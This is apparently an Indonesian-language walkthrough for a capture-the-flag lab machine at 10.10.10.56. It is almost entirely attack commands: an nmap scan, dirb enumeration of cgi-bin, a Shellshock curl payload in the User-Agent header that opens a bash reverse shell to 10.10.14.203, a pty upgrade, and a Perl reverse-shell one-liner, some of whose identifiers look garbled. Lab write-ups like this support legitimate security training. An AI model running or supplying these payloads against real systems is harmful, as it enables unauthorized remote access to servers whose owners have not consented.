1. nmap -sS -sC 10.10.10.56 -oN nmap.txt
open 80 dan 2222

2. buka web nya pada port 80
3. lakukan directory traversal menggunakan dirb
dirb http://10.10.10.56

Didapatkan hasil cgi-bin ketemu. 
cgi-bin digunakan untuk interaksi Web Browser untuk meningkatkan,
kualitas web page atau website

4. mampir ke sini
https://serverpilot.io/docs/how-to-create-a-cgi-bin-directory/

didapati bahwa ada file yang memerlukan .sh

5. ketik lagi
dirp http://10.10.10.56/cgi-bin -X .sh

ditemukan sebuah file .sh pada /cgi-bin/user.sh

6.1. jalankan listener/netcat
sudo nc -lnvp 1234

6.2. lakukan curl
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.203/1234 0>&1' http://10.10.10.56/cgi-bin/user.sh

7. jalankan reverse shell
python3 -c 'import pty; pty.spawn("/bin/sh")' 

8. privilege escalation
sudo -l

https://highon.coffee/blog/reverse-shell-cheat-sheet/

9.1 netcat 
nc -lnvp 4321

9.2 jalankan command berikut
perl -e 'use Socket;$i="10.10.14.203";$p=4321;socket(S,PFINET,SOCKSTREAM,getprotobyname("tcp"));if(connect(S,sockaddrin($p,inetaton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
